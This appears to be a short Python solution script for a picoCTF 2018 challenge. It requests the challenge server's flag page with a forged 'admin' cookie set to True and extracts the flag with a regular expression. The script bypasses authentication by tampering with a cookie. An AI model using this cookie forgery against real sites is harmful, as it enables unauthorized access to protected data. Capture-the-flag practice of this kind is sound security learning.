#!/usr/bin/env python
import requests
import re

url = 'http://2018shell.picoctf.com:52920/flag'

req = requests.get(url, cookies={'admin': 'True'})

print(re.search(r'picoCTF{.*}', req.text)[0])